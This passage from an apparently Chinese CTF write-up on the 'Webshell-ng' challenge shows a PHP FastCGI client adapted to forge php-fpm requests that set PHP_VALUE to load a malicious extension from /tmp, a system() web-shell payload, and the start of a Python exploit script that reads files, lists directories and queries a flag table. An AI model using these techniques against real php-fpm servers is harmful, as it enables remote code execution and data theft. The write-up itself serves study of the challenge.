invoke__">chr</span>((<span class="variable">$nlen</span> &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . <span class="title function_ invoke__">chr</span>((<span class="variable">$nlen</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . <span class="title function_ invoke__">chr</span>((<span class="variable">$nlen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . <span class="title function_ invoke__">chr</span>(<span class="variable">$nlen</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$vlen</span> &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$vlen</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> .= <span class="title function_ invoke__">chr</span>((<span class="variable">$vlen</span> &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . <span class="title function_ invoke__">chr</span>((<span class="variable">$vlen</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . <span class="title function_ invoke__">chr</span>((<span class="variable">$vlen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . <span class="title function_ invoke__">chr</span>(<span class="variable">$vlen</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* nameData &amp; valueData */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$nvpair</span> . <span class="variable">$name</span> . <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read a set of FastCGI Name value pairs</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $data Data containing the set of FastCGI NVPair</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array of NVPair</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readNvpair</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$length</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$array</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$length</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="variable">$length</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$p</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$p</span> != <span class="variable">$length</span>) &#123;</span><br><span class="line">            <span class="variable">$nlen</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$nlen</span> &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                <span class="variable">$nlen</span> = (<span class="variable">$nlen</span> &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$vlen</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$vlen</span> &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                <span class="variable">$vlen</span> = (<span class="variable">$nlen</span> &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$array</span>[<span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="variable">$p</span>, <span class="variable">$nlen</span>)] = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="variable">$p</span>+<span class="variable">$nlen</span>, <span class="variable">$vlen</span>);</span><br><span class="line">            <span class="variable">$p</span> += (<span class="variable">$nlen</span> + <span class="variable">$vlen</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$array</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Decode a FastCGI Packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $data String containing all the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">decodePacketHeader</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;version&#x27;</span>]       = <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="number">0</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;type&#x27;</span>]          = <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="number">1</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;requestId&#x27;</span>]     = (<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="number">2</span>&#125;) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="number">3</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;contentLength&#x27;</span>] = (<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="number">4</span>&#125;) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="number">5</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;paddingLength&#x27;</span>] = <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="number">6</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;reserved&#x27;</span>]      = <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="number">7</span>&#125;);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read a FastCGI Packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readPacket</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$packet</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;_sock, <span class="built_in">self</span>::<span class="variable constant_">HEADER_LEN</span>)) &#123;</span><br><span class="line">            <span class="variable">$resp</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">decodePacketHeader</span>(<span class="variable">$packet</span>);</span><br><span class="line">            <span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;contentLength&#x27;</span>]) &#123;</span><br><span class="line">                <span class="variable">$len</span>  = <span class="variable">$resp</span>[<span class="string">&#x27;contentLength&#x27;</span>];</span><br><span class="line">                <span class="keyword">while</span> (<span class="variable">$len</span> &amp;&amp; <span class="variable">$buf</span>=<span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;_sock, <span class="variable">$len</span>)) &#123;</span><br><span class="line">                    <span class="variable">$len</span> -= <span class="title function_ invoke__">strlen</span>(<span class="variable">$buf</span>);</span><br><span class="line">                    <span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>] .= <span class="variable">$buf</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;paddingLength&#x27;</span>]) &#123;</span><br><span class="line">                <span class="variable">$buf</span>=<span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;_sock, <span class="variable">$resp</span>[<span class="string">&#x27;paddingLength&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$resp</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get Informations on the FastCGI application</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $requestedInfo information to retrieve</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getValues</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$requestedInfo</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">connect</span>();</span><br><span class="line">        <span class="variable">$request</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$requestedInfo</span> <span class="keyword">as</span> <span class="variable">$info</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildNvpair</span>(<span class="variable">$info</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;_sock, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">buildPacket</span>(<span class="built_in">self</span>::<span class="variable constant_">GET_VALUES</span>, <span class="variable">$request</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="variable">$resp</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">readPacket</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;type&#x27;</span>] == <span class="built_in">self</span>::<span class="variable constant_">GET_VALUES_RESULT</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">readNvpair</span>(<span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>], <span class="variable">$resp</span>[<span class="string">&#x27;length&#x27;</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;Unexpected response type, expecting GET_VALUES_RESULT&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Execute a request to the FastCGI application</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $params Array of parameters</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $stdin Content</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$params</span>, <span class="variable">$stdin</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$response</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">//        $this-&gt;connect();</span></span><br><span class="line">        <span class="variable">$request</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildPacket</span>(<span class="built_in">self</span>::<span class="variable constant_">BEGIN_REQUEST</span>, <span class="title function_ invoke__">chr</span>(<span class="number">0</span>) . <span class="title function_ invoke__">chr</span>(<span class="built_in">self</span>::<span class="variable constant_">RESPONDER</span>) . <span class="title function_ invoke__">chr</span>((<span class="keyword">int</span>) <span class="variable">$this</span>-&gt;_keepAlive) . <span class="title function_ invoke__">str_repeat</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="number">5</span>));</span><br><span class="line">        <span class="variable">$paramsRequest</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$paramsRequest</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildNvpair</span>(<span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$paramsRequest</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildPacket</span>(<span class="built_in">self</span>::<span class="variable constant_">PARAMS</span>, <span class="variable">$paramsRequest</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$request</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildPacket</span>(<span class="built_in">self</span>::<span class="variable constant_">PARAMS</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$stdin</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildPacket</span>(<span class="built_in">self</span>::<span class="variable constant_">STDIN</span>, <span class="variable">$stdin</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$request</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildPacket</span>(<span class="built_in">self</span>::<span class="variable constant_">STDIN</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;data=&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$request</span>));</span><br><span class="line"><span class="comment">//        fwrite($this-&gt;_sock, $request);</span></span><br><span class="line"><span class="comment">//        do &#123;</span></span><br><span class="line"><span class="comment">//            $resp = $this-&gt;readPacket();</span></span><br><span class="line"><span class="comment">//            if ($resp[&#x27;type&#x27;] == self::STDOUT || $resp[&#x27;type&#x27;] == self::STDERR) &#123;</span></span><br><span class="line"><span class="comment">//                $response .= $resp[&#x27;content&#x27;];</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125; while ($resp &amp;&amp; $resp[&#x27;type&#x27;] != self::END_REQUEST);</span></span><br><span class="line"><span class="comment">//        var_dump($resp);</span></span><br><span class="line"><span class="comment">//        if (!is_array($resp)) &#123;</span></span><br><span class="line"><span class="comment">//            throw new Exception(&#x27;Bad request&#x27;);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        switch (ord($resp[&#x27;content&#x27;]&#123;4&#125;)) &#123;</span></span><br><span class="line"><span class="comment">//            case self::CANT_MPX_CONN:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;This app can\&#x27;t multiplex [CANT_MPX_CONN]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::OVERLOADED:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;New request rejected; too busy [OVERLOADED]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::UNKNOWN_ROLE:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;Role value not known [UNKNOWN_ROLE]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::REQUEST_COMPLETE:</span></span><br><span class="line"><span class="comment">//                return $response;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// real exploit start here</span></span><br><span class="line"><span class="comment">//if (!isset($_REQUEST[&#x27;cmd&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">//    die(&quot;Check your input\n&quot;);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//if (!isset($_REQUEST[&#x27;filepath&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">//    $filepath = __FILE__;</span></span><br><span class="line"><span class="comment">//&#125;else&#123;</span></span><br><span class="line"><span class="comment">//    $filepath = $_REQUEST[&#x27;filepath&#x27;];</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$filepath</span> = <span class="string">&quot;/var/www/html/add_api.php&quot;</span>;  <span class="comment">//SCRIPT_FILENAME</span></span><br><span class="line"><span class="variable">$req</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$filepath</span>);</span><br><span class="line"><span class="variable">$uri</span> = <span class="variable">$req</span> .<span class="string">&#x27;?&#x27;</span>.<span class="string">&#x27;command=whoami&#x27;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> <span class="title class_">FCGIClient</span>(<span class="string">&quot;unix:///var/run/php-fpm.sock&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&quot;&lt;?php system(\$_REQUEST[&#x27;command&#x27;]); phpinfo(); ?&gt;&quot;</span>; <span class="comment">// php payload -- Doesnt do anything</span></span><br><span class="line"><span class="variable">$php_value</span> = <span class="string">&quot;extension = /tmp/exp.so&quot;</span>;</span><br><span class="line"><span class="variable">$php_admin_value</span> = <span class="string">&quot;extension = /tmp/exp.so&quot;</span>;</span><br><span class="line"><span class="variable">$params</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span> =&gt; <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_METHOD&#x27;</span>    =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>   =&gt; <span class="variable">$filepath</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_NAME&#x27;</span>       =&gt; <span class="variable">$req</span>,</span><br><span class="line">    <span class="string">&#x27;QUERY_STRING&#x27;</span>      =&gt; <span class="string">&#x27;command=whoami&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_URI&#x27;</span>       =&gt; <span class="variable">$uri</span>,</span><br><span class="line">    <span class="string">&#x27;DOCUMENT_URI&#x27;</span>      =&gt; <span class="variable">$req</span>,</span><br><span class="line"><span class="comment">#&#x27;DOCUMENT_ROOT&#x27;     =&gt; &#x27;/&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;PHP_VALUE&#x27;</span>         =&gt; <span class="variable">$php_value</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>   =&gt; <span class="string">&#x27;80sec/wofeiwo&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_ADDR&#x27;</span>       =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_PORT&#x27;</span>       =&gt; <span class="string">&#x27;9000&#x27;</span>, <span class="comment">//é¶æœºfpmçš„ç›‘å¬ç«¯å£</span></span><br><span class="line">    <span class="string">&#x27;SERVER_ADDR&#x27;</span>       =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PORT&#x27;</span>       =&gt; <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_NAME&#x27;</span>       =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>   =&gt; <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>    =&gt; <span class="number">0</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">// print_r($_REQUEST);</span></span><br><span class="line"><span class="comment">// print_r($params);</span></span><br><span class="line"><span class="comment">//echo &quot;Call: $uri\n\n&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$client</span>-&gt;<span class="title function_ invoke__">request</span>(<span class="variable">$params</span>, <span class="variable">$code</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åŒæ ·çš„è„šæœ¬,æ”¹æ”¹extensionå°±è¡Œ,å…¶å®ƒå‚æ•°å…³ç³»ä¸å¤§.</p><p><img src="/2023/12/04/JQCTF-Webshell-ng/1702201651915.png" alt="1702201651915"></p><h1 id="å®Œæ•´exp"><span id="å®Œæ•´exp"> å®Œæ•´exp</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import inspect</span><br><span class="line">import itertools</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://127.0.0.1:10800/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">sql</span>():</span><br><span class="line">    code = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    NEW ReflectionClass mysqli refClass</span></span><br><span class="line"><span class="string">    ICALL refClass newInstanceArgs mysqli_arg mysqli1</span></span><br><span class="line"><span class="string">    ICALL mysqli1 query query_arg result</span></span><br><span class="line"><span class="string">    ICALL result fetch_all res row</span></span><br><span class="line"><span class="string">    CALL var_dump row _</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    code = inspect.<span class="title function_ invoke__">cleandoc</span>(code)</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;mysqli&quot;</span>: <span class="string">&quot;mysqli&quot;</span>,</span><br><span class="line">        <span class="string">&quot;mysqli_arg&quot;</span>: [<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;web&quot;</span>, <span class="string">&quot;web&quot;</span>, <span class="string">&quot;web&quot;</span>],</span><br><span class="line">        <span class="string">&quot;query_arg&quot;</span>: <span class="string">&quot;select * from f1ag&quot;</span>,</span><br><span class="line">        <span class="string">&quot;res&quot;</span>:<span class="string">&quot;1&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> code, data</span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">scandir</span>():</span><br><span class="line">    code = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    CALL scandir a1 r1</span></span><br><span class="line"><span class="string">    CALL var_dump r1 r2</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    code = inspect.<span class="title function_ invoke__">cleandoc</span>(code)</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;a1&quot;</span>: <span class="string">&quot;/tmp&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> code, data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">readfile</span>():</span><br><span class="line">    code = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    CALL file_get_contents a1 r1</span></span><br><span class="line"><span class="string">    CALL var_dump r1 r2</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    code = 